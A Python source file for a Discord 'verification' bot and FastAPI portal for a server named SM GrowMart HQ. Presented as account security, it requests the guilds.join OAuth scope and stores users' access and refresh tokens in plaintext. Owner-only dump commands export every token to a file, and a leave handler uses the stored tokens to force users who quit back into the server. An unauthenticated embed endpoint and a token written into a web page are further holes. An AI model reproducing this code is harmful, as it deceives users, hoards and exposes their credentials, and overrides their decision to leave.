import os
import asyncio
import logging
from datetime import datetime
from typing import Optional
import urllib.parse

from fastapi import FastAPI, Request, Query, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
import httpx
import uvicorn
import discord
from discord.ext import commands, tasks
import psycopg2
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("DiscordVerifier")

# Secrets and Configuration
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI", "https://verify.digamber.in/callback")
GUILD_ID = os.getenv("GUILD_ID")  # Discord Server ID
ROLE_ID = os.getenv("VERIFIED_ROLE_ID")  # Role to assign on verification
DATABASE_URL = os.getenv("DATABASE_URL")  # Postgres URL from Render
DATABASE_URL2 = os.getenv("DATABASE_URL2")

OAUTH_SCOPES = "identify email guilds.join"

from contextlib import asynccontextmanager

# Initialize FastAPI App
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Database initialization
    init_db()
    init_db2()
    
    # Run discord client in background
    if DISCORD_TOKEN:
        asyncio.create_task(bot.start(DISCORD_TOKEN))
        logger.info("Discord Bot client started in background task.")
    else:
        logger.error("DISCORD_TOKEN environment variable is missing!")
    yield

app = FastAPI(title="SM GrowMart HQ Verification Portal", lifespan=lifespan)

# Convert legacy postgres:// to postgresql:// if needed for psycopg2
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
    
if DATABASE_URL2 and DATABASE_URL2.startswith("postgres://"):
    DATABASE_URL2 = DATABASE_URL2.replace("postgres://", "postgresql://", 1)

# Initialize Database Tables
def init_db():
    if not DATABASE_URL:
        logger.warning("DATABASE_URL not set. Running in-memory mode (restarts will clear session records).")
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        # Table for storing user details
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                discord_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100) NOT NULL,
                access_token TEXT,
                refresh_token TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS guild_configs (
                guild_id VARCHAR(50) PRIMARY KEY,
                role_id VARCHAR(50) NOT NULL
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Successfully initialized PostgreSQL tables.")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")

def init_db2():
    if not DATABASE_URL2:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL2)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS friend_guild_configs (
                guild_id VARCHAR(50) PRIMARY KEY,
                role_id VARCHAR(50) NOT NULL
            );
        """)
        conn.commit()
        try:
            cur.execute("ALTER TABLE friend_guild_configs ADD COLUMN embed_title TEXT;")
            conn.commit()
        except Exception:
            conn.rollback()
        try:
            cur.execute("ALTER TABLE friend_guild_configs ADD COLUMN embed_desc TEXT;")
            conn.commit()
        except Exception:
            conn.rollback()

        cur.execute("""
            CREATE TABLE IF NOT EXISTS friend_verified_users (
                discord_id VARCHAR(50),
                guild_id VARCHAR(50),
                username VARCHAR(100) NOT NULL,
                access_token TEXT,
                refresh_token TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (discord_id, guild_id)
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Successfully initialized PostgreSQL OVER SECONDARY DB.")
    except Exception as e:
        logger.error(f"Error initializing SECONDARY database: {e}")

# Save Verification Data
def save_verification(discord_id: str, username: str, access_token: str, refresh_token: str):
    if not DATABASE_URL:
        return
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO verified_users (discord_id, username, access_token, refresh_token, verified_at)
            VALUES (%s, %s, %s, %s, NOW())
            ON CONFLICT (discord_id) DO UPDATE SET
                username = EXCLUDED.username,
                access_token = EXCLUDED.access_token,
                refresh_token = EXCLUDED.refresh_token,
                verified_at = NOW();
        """, (discord_id, username, access_token, refresh_token))
        conn.commit()
        cur.close()
        conn.close()
        logger.info(f"Saved/Updated user {username} ({discord_id}) in the database.")
    except Exception as e:
        logger.error(f"Failed to write verification to DB: {e}")

def get_guild_role(guild_id: str):
    if not DATABASE_URL:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT role_id FROM guild_configs WHERE guild_id = %s", (str(guild_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0]
    except Exception as e:
        logger.error(f"Error fetching guild config: {e}")
    return None

def set_guild_role(guild_id: str, role_id: str):
    if not DATABASE_URL:
        return
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO guild_configs (guild_id, role_id)
            VALUES (%s, %s)
            ON CONFLICT (guild_id) DO UPDATE SET role_id = EXCLUDED.role_id;
        """, (str(guild_id), str(role_id)))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving guild config: {e}")

def get_friend_config(guild_id: str):
    if not DATABASE_URL2:
        return None, None, None
    try:
        conn = psycopg2.connect(DATABASE_URL2)
        cur = conn.cursor()
        cur.execute("SELECT role_id, embed_title, embed_desc FROM friend_guild_configs WHERE guild_id = %s", (str(guild_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1], row[2]
    except Exception as e:
        logger.error(f"Error fetching friend guild config: {e}")
    return None, None, None

def get_friend_role(guild_id: str):
    role_id, _, _ = get_friend_config(guild_id)
    return role_id

def save_friend_verification(discord_id: str, guild_id: str, username: str, access_token: str, refresh_token: str):
    if not DATABASE_URL2:
        return
    try:
        conn = psycopg2.connect(DATABASE_URL2)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO friend_verified_users (discord_id, guild_id, username, access_token, refresh_token, verified_at)
            VALUES (%s, %s, %s, %s, %s, NOW())
            ON CONFLICT (discord_id, guild_id) DO UPDATE SET
                username = EXCLUDED.username,
                access_token = EXCLUDED.access_token,
                refresh_token = EXCLUDED.refresh_token,
                verified_at = NOW();
        """, (discord_id, guild_id, username, access_token, refresh_token))
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to write friend verification to DB2: {e}")

def get_friend_user_tokens(discord_id: str, guild_id: str):
    if not DATABASE_URL2:
        return None, None
    try:
        conn = psycopg2.connect(DATABASE_URL2)
        cur = conn.cursor()
        cur.execute("SELECT access_token, refresh_token FROM friend_verified_users WHERE discord_id = %s AND guild_id = %s", (str(discord_id), str(guild_id)))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1]
    except Exception as e:
        pass
    return None, None

def get_user_tokens(discord_id: str):
    if not DATABASE_URL:
        return None, None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT access_token, refresh_token FROM verified_users WHERE discord_id = %s", (str(discord_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1]
    except Exception as e:
        logger.error(f"DB Read Error: {e}")
    return None, None

async def refresh_access_token(discord_id: str, refresh_token: str):
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID or "",
        "client_secret": CLIENT_SECRET or "",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    }
    async with httpx.AsyncClient() as client:
        resp = await client.post(token_url, data=data, headers=headers)
        if resp.status_code == 200:
            token_data = resp.json()
            new_acc = token_data.get("access_token")
            new_ref = token_data.get("refresh_token")
            try:
                conn = psycopg2.connect(DATABASE_URL)
                cur = conn.cursor()
                cur.execute("UPDATE verified_users SET access_token = %s, refresh_token = %s WHERE discord_id = %s", (new_acc, new_ref, str(discord_id)))
                conn.commit()
                cur.close()
                conn.close()
                logger.info(f"Successfully refreshed and stored token for user {discord_id}")
            except Exception as e:
                logger.error(f"Failed to store refreshed token for {discord_id}: {e}")
            return new_acc
        elif resp.status_code in [400, 401]:
            logger.error(f"Token refresh completely failed (deauthorized/invalid auth): {resp.text}")
            return "REVOKED"
        else:
            logger.error(f"Failed to refresh token (possible server error): {resp.text}")
    return None

# Initialize Discord Bot client
intents = discord.Intents.default()
intents.members = True  # Required to edit user roles
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Run discord.py bot alongside FastAPI in asyncio

async def dispatch_premium_embed(channel_id: int):
    channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
    if not channel:
        raise Exception("Channel not found on server or bot has no permission directly.")

    guild_id = str(channel.guild.id)
    
    desc = (
        "<:insane:1399760780009672734> **SM GrowMart HQ**\n\n"
        "<a:emoji_421:1430254423971594451> Secure your access and unlock the complete server experience.\n\n"
        "<a:emoji_38:1410748094420750406>  **Verified Members Receive**\n"
        "> <a:features:1408543952671346768> Instant role assignment\n"
        "> <a:features:1408543952671346768> Exclusive channels unlocked\n"
        "> <a:features:1408543952671346768> Enhanced account security\n\n"
        "📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n"
        "-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."
    )

    if guild_id != str(GUILD_ID):
        # Fetch from custom configs
        role_id, c_title, c_desc = get_friend_config(guild_id)
        if c_title and c_desc:
            desc = f"**{c_title}**\n\n{c_desc}\n\n📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."

    # Build beautiful premium interactive embed
    embed = discord.Embed(
        color=discord.Color.from_rgb(43, 45, 49), # Matches seamless Discord dark block background
        description=desc
    )
    
    # Generate OAuth URL
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES,
        "state": str(channel.guild.id)
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    
    # Add beautiful button linking authorization
    button = discord.ui.Button(
        label="Verify Identity Now",
        url=auth_url,
        style=discord.ButtonStyle.link,
        emoji=discord.PartialEmoji(name="verified", id=1408545305594433546, animated=True)
    )
    
    view = discord.ui.View()
    view.add_item(button)
    
    await channel.send(embed=embed, view=view)


@tasks.loop(hours=6)
async def check_authorizations():
    logger.info("Starting background check for deauthorized users...")
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT discord_id, access_token, refresh_token FROM verified_users")
        users = cur.fetchall()
        cur.close()
        conn.close()
    except Exception as e:
        logger.error(f"Failed to fetch users from DB for check: {e}")
        return

    if not users:
        return

    guild = bot.get_guild(int(GUILD_ID)) if GUILD_ID else None
    if not guild:
        try:
            guild = await bot.fetch_guild(int(GUILD_ID))
        except Exception:
            logger.error("Could not fetch guild for background check.")
            return

    role = guild.get_role(int(ROLE_ID)) if ROLE_ID else None
    if not role:
        logger.error(f"Could not find role {ROLE_ID} in guild {GUILD_ID}.")
        return

    async with httpx.AsyncClient() as client:
        # Check users in batches to be safe, but a delay is good too
        for discord_id, access_token, refresh_token in users:
            try:
                await asyncio.sleep(2)
                
                user_api_url = "https://discord.com/api/users/@me"
                headers = {"Authorization": f"Bearer {access_token}"}
                
                resp = await client.get(user_api_url, headers=headers)
                
                if resp.status_code == 401:
                    logger.info(f"Token for {discord_id} expired. Attempting refresh...")
                    new_acc = await refresh_access_token(discord_id, refresh_token)
                    
                    if new_acc == "REVOKED":
                        logger.warning(f"Refresh failed for {discord_id} with REVOKED status. Deleting from DB and removing role...")
                        try:
                            # 1. Remove role
                            member = guild.get_member(int(discord_id))
                            if not member:
                                try:
                                    member = await guild.fetch_member(int(discord_id))
                                except discord.NotFound:
                                    member = None
                            
                            if member:
                                await member.remove_roles(role, reason="User deauthorized the bot.")
                                logger.info(f"Removed role from member {discord_id}.")
                            
                            # 2. Delete from DB
                            conn = psycopg2.connect(DATABASE_URL)
                            cur = conn.cursor()
                            cur.execute("DELETE FROM verified_users WHERE discord_id = %s", (str(discord_id),))
                            conn.commit()
                            cur.close()
                            conn.close()
                                
                        except Exception as e:
                            logger.error(f"Error while un-verifying user {discord_id}: {e}")
            except Exception as e:
                logger.error(f"Error checking user {discord_id}: {e}")

@bot.event
async def on_ready():
    logger.info(f"Discord Bot online as {bot.user}")
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} command(s)")
    except Exception as e:
        logger.error(f"Failed to sync commands: {e}")
        
    if not check_authorizations.is_running():
        check_authorizations.start()

@bot.tree.command(name="setup", description="Configure verification role and send embed in this channel.")
@discord.app_commands.describe(role="The role to give to verified members in this server")
@discord.app_commands.default_permissions(administrator=True)
async def setup_slash(interaction: discord.Interaction, role: discord.Role):
    allowed = interaction.user.guild_permissions.administrator
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command. Requires Administrator.", ephemeral=True)
        return
        
    try:
        set_guild_role(str(interaction.guild.id), str(role.id))
        await dispatch_premium_embed(interaction.channel_id)
        await interaction.response.send_message(f"Verification embed sent and role `{role.name}` saved for this server!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Failed to send embed: {e}", ephemeral=True)

@bot.tree.command(name="dump", description="Dump user data (Owner only)")
async def dump_data(interaction: discord.Interaction):
    # Check if the user is the owner
    allowed = await bot.is_owner(interaction.user)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
        return

    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await interaction.response.send_message("No data found in the database.", ephemeral=True)
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await interaction.response.send_message("Here is the database dump:", file=file, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await interaction.response.send_message("An error occurred while dumping the database.", ephemeral=True)

@bot.command(name="setup")
async def setup_embed(ctx: commands.Context):
    # Check if the user is the owner
    allowed = await bot.is_owner(ctx.author)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        return
        
    try:
        await dispatch_premium_embed(ctx.channel.id)
        await ctx.send("Embed sent!", delete_after=5)
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f"Failed to send embed: {e}", delete_after=5)

@bot.command(name="dump")
async def dump_data_text(ctx: commands.Context):
    # Check if the user is the owner
    allowed = await bot.is_owner(ctx.author)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        return

    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await ctx.send("No data found in the database.")
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await ctx.send("Here is the database dump:", file=file)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await ctx.send("An error occurred while dumping the database.")

async def perform_auto_join(discord_id: int, guild_id: str, role_id: str, acc: str, ref: str):
    logger.info(f"User {discord_id} left {guild_id}. Attempting auto-join...")
    if not DISCORD_TOKEN:
        return
        
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{discord_id}"
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}",
        "Content-Type": "application/json"
    }

    async def attempt_join(token):
        payload = {"access_token": token}
        async with httpx.AsyncClient() as client:
            return await client.put(url, headers=headers, json=payload)

    resp = await attempt_join(acc)
    
    if resp.status_code == 401 and ref:
        logger.info(f"Token expired for user {discord_id}. Attempting refresh.")
        new_acc = await refresh_access_token(str(discord_id), ref)
        if new_acc and new_acc != "REVOKED":
            resp = await attempt_join(new_acc)

    if resp.status_code in [201, 204]:
        logger.info(f"Successfully auto-joined user {discord_id} back into server {guild_id}.")
        
        # Re-assign the verified role if not added by join
        if role_id:
            role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{discord_id}/roles/{role_id}"
            async with httpx.AsyncClient() as client:
                await client.put(role_url, headers=headers)
    else:
        logger.error(f"Failed to auto-join user {discord_id} to {guild_id}. Status: {resp.status_code}")

@bot.event
async def on_member_remove(member):
    # Auto-join them back ONLY to the Main server if they leave the Main server.
    if str(member.guild.id) == str(GUILD_ID):
        acc, ref = get_user_tokens(str(member.id))
        if acc:
            await perform_auto_join(member.id, str(member.guild.id), ROLE_ID, acc, ref)

import os

def load_template(filename: str) -> str:
    path = os.path.join(os.path.dirname(__file__), "templates", filename)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()

# HTML Templates loaded from files for smooth premium UI response
SUCCESS_HTML = load_template("success.html")
ERROR_HTML = load_template("error.html")
GUIDE_HTML = load_template("guide.html")
HOME_HTML = load_template("home.html")


def render_error(error_title="", error_detail="", retry_url=""):
    return ERROR_HTML.replace("{error_title}", str(error_title)).replace("{error_detail}", str(error_detail)).replace("{retry_url}", str(retry_url))

def render_success(username=""):
    return SUCCESS_HTML.replace("{username}", str(username))


# Home page / portal landing index
@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def home_page():
    # Generate the OAuth authorize URL dynamically
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return HTMLResponse(content=HOME_HTML.replace("{{auth_url}}", auth_url))

# Guide Page
@app.api_route("/guide", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def guide_page():
    return HTMLResponse(content=GUIDE_HTML)

from pydantic import BaseModel
class SetupConfig(BaseModel):
    guild_id: str
    channel_id: str
    role_id: str
    embed_title: Optional[str] = None
    embed_desc: Optional[str] = None

async def verify_admin(token: str, target_guild_id: str) -> bool:
    # Just prefix with Bearer if not present
    if not token.startswith("Bearer "):
        token = "Bearer " + token
    async with httpx.AsyncClient() as client:
        res = await client.get("https://discord.com/api/users/@me/guilds", headers={"Authorization": token})
        if res.status_code != 200:
            return False
        guilds = res.json()
        for g in guilds:
            # Permissions can be string or int from discord api
            try:
                perms = int(g.get("permissions", 0))
                if str(g["id"]) == str(target_guild_id) and (perms & 0x8) == 0x8:
                    return True
            except Exception:
                pass
    return False

@app.get("/setup", response_class=HTMLResponse)
async def setup_page():
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": "identify guilds",
        "state": "web_setup"
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return RedirectResponse(url=auth_url)

@app.get("/api/guild_details")
async def get_guild_details(guild_id: str, request: Request):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not await verify_admin(auth_header, guild_id):
        raise HTTPException(status_code=403, detail="Unauthorized or not admin of guild.")
        
    guild = bot.get_guild(int(guild_id))
    if not guild:
        try:
            guild = await bot.fetch_guild(int(guild_id))
        except Exception:
            guild = None
            
    if not guild:
        invite_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot&guild_id={guild_id}"
        return {"in_guild": False, "invite_url": invite_url}
        
    channels = [{"id": str(c.id), "name": c.name} for c in guild.text_channels]
    roles = [{"id": str(r.id), "name": r.name} for r in guild.roles]
    return {"in_guild": True, "channels": channels, "roles": roles}

@app.post("/api/save_setup")
async def save_setup(data: SetupConfig, request: Request):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not await verify_admin(auth_header, data.guild_id):
        raise HTTPException(status_code=403, detail="Unauthorized or not admin of guild.")
        
    # Save to DATABASE_URL2
    if DATABASE_URL2:
        try:
            conn = psycopg2.connect(DATABASE_URL2)
            cur = conn.cursor()
            query = """
                INSERT INTO friend_guild_configs (guild_id, role_id, embed_title, embed_desc)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (guild_id) DO UPDATE SET 
                role_id = EXCLUDED.role_id,
                embed_title = EXCLUDED.embed_title,
                embed_desc = EXCLUDED.embed_desc;
            """
            cur.execute(query, (str(data.guild_id), str(data.role_id), data.embed_title, data.embed_desc))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error saving to DB2: {e}")
            raise HTTPException(status_code=500, detail="Database Error")
            
    # Dispatch embed
    try:
        await dispatch_premium_embed(int(data.channel_id))
        return {"success": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# OAuth2 Redirect / callback route
@app.get("/callback", response_class=HTMLResponse)
async def callback_handler(code: Optional[str] = None, state: Optional[str] = None):
    # Prepare authorization oauth retry reference link
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    retry_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"

    if not code:
        return HTMLResponse(
            content=render_error(
                error_title="Authorization Cancelled",
                error_detail="We could not receive your verified identity tokens because you declined the authorisation popup request. Access permissions could not be validated.",
                retry_url=retry_url
            ),
            status_code=400
        )

    if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
        return HTMLResponse(
            content=render_error(
                error_title="OAuth System Misconfiguration",
                error_detail="Bot owner has not registered DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, or DISCORD_REDIRECT_URI environment parameters on Render environment space.",
                retry_url=retry_url
            ),
            status_code=500
        )

    # Exchange Authorization Code for Token
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }

    async with httpx.AsyncClient() as client:
        try:
            # 1. Post request key exchange
            token_response = await client.post(token_url, data=data, headers=headers)
            if token_response.status_code != 200:
                logger.error(f"Token exchange failed: {token_response.text}")
                return HTMLResponse(
                    content=render_error(
                        error_title="OAuth Token Exchange Error",
                        error_detail=f"Failed to fetch security credentials from Discord API services: {token_response.json().get('error_description', 'Invalid Code Parameter')}",
                        retry_url=retry_url
                    ),
                    status_code=400
                )
            
            token_data = token_response.json()
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            
            if state == "web_setup":
                setup_html = load_template("setup.html")
                setup_html = setup_html.replace("{{access_token}}", access_token)
                setup_html = setup_html.replace("{{client_id}}", str(CLIENT_ID))
                return HTMLResponse(setup_html)

            # 2. Get User Profile info database query matching
            user_response = await client.get(
                "https://discord.com/api/users/@me",
                headers={"Authorization": f"Bearer {access_token}"}
            )

            if user_response.status_code != 200:
                return HTMLResponse(
                    content=render_error(
                        error_title="Identity Extraction Refused",
                        error_detail="Discord successfully generated authorization credentials but restricted profile query reading permission limits.",
                        retry_url=retry_url
                    ),
                    status_code=400
                )

            user_data = user_response.json()
            discord_id = user_data.get("id")
            username = user_data.get("username")

            # Inline helper to verify, join, and assign roles for a given guild and role
            async def verify_user_in_guild(target_guild_id: str, target_role_id: str) -> tuple[bool, str, int]:
                if not bot.is_ready():
                    return False, "Gateway bot backend is starting up. Reload or retry in a few seconds.", 503
                
                guild = bot.get_guild(int(target_guild_id))
                if not guild:
                    try:
                        guild = await bot.fetch_guild(int(target_guild_id))
                    except Exception:
                        guild = None
                if not guild:
                    return False, "Target guild not found or bot is not in the server.", 404
                    
                member = guild.get_member(int(discord_id))
                if not member:
                    try:
                        member = await guild.fetch_member(int(discord_id))
                    except Exception:
                        try:
                            # User is not a member, try adding them automatically
                            add_member_url = f"https://discord.com/api/guilds/{target_guild_id}/members/{discord_id}"
                            add_headers = {"Authorization": f"Bot {DISCORD_TOKEN}", "Content-Type": "application/json"}
                            add_data = {"access_token": access_token}
                            add_resp = await client.put(add_member_url, json=add_data, headers=add_headers)
                            if add_resp.status_code in [201, 204]:
                                await asyncio.sleep(1)
                                member = await guild.fetch_member(int(discord_id))
                            else:
                                return False, "Failed to join you to the server using OAuth. Please join the server manually first.", 400
                        except Exception as e:
                            logger.error(f"Add user exception: {e}")
                            return False, f"Failed to join you to server automatically.", 400
                            
                if not member:
                    return False, "Member not found after attempt to add.", 400
                    
                role = guild.get_role(int(target_role_id))
                if not role:
                    return False, f"Verified role not found in server.", 404
                    
                try:
                    if role not in member.roles:
                        await member.add_roles(role)
                        logger.info(f"Verified & assigned role in {target_guild_id} to member: {username}")
                except discord.errors.Forbidden:
                    return False, "The bot doesn't have permissions to assign the verified role. Check the bot's role hierarchy.", 403
                except Exception as e:
                    return False, f"Failed to assign role: {e}", 500
                    
                return True, "Success", 200

            # 3. Dynamic server role assign action!
            if not GUILD_ID or not ROLE_ID:
                return HTMLResponse(
                    content=render_error("Deployment Targets Missing", "Target server (GUILD_ID) and reward category (VERIFIED_ROLE_ID) are missing.", retry_url),
                    status_code=500
                )

            # Always verify and add to main server
            main_success, main_err, main_code = await verify_user_in_guild(GUILD_ID, ROLE_ID)
            if not main_success:
                return HTMLResponse(content=render_error("Verification Failed (Main)", main_err, retry_url), status_code=main_code)

            # Optional: Add to friend's server if authorized from there
            if state and state != str(GUILD_ID):
                friend_role_id = get_friend_role(state)
                # If they set up a role in the partner server, attempt to join and role them there too.
                # Since the main condition is that they join the main server, if friend server drops, we still succeed or we can ignore friend server errors.
                if friend_role_id:
                    friend_success, friend_err, _ = await verify_user_in_guild(state, friend_role_id)
                    if not friend_success:
                        logger.warning(f"Could not verify in partner server {state}: {friend_err}")
                    else:
                        save_friend_verification(discord_id=discord_id, guild_id=state, username=username, access_token=access_token, refresh_token=refresh_token)

            # 4. Save information into database securely (Render PostgreSQL)
            save_verification(discord_id=discord_id, username=username, access_token=access_token, refresh_token=refresh_token)

            return HTMLResponse(
                content=render_success(username=username),
                status_code=200
            )

        except Exception as e:
            logger.exception("Inbound verification execution system error")
            return HTMLResponse(
                content=render_error(
                    error_title="Service Exception Error",
                    error_detail=f"An unhandled execution crash occurred during your transaction sequence: {str(e)}",
                    retry_url=retry_url
                ),
                status_code=500
            )


# -------------------------------------------------------------
# Trigger Panel Setup (Termux / API POST)
# -------------------------------------------------------------

@app.post("/api/send-embed")
async def send_verification_embed(channel_id: str):
    """ Allows triggering the setup via Termux/CURL (POST request) """
    if not bot.is_ready():
        raise HTTPException(status_code=503, detail="Gateway bot client connecting runtime standby...")
    
    try:
        await dispatch_premium_embed(int(channel_id))
        return {"success": True, "message": "Embed dispatch completed successfully via Termux/POST!"}
    
    except Exception as e:
        logger.exception("Embed dispatch crash event via POST")
        raise HTTPException(status_code=500, detail=f"Inbound processing failed: {str(e)}")

# Launch application
if __name__ == "__main__":
    port = int(os.getenv("PORT", 3000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)
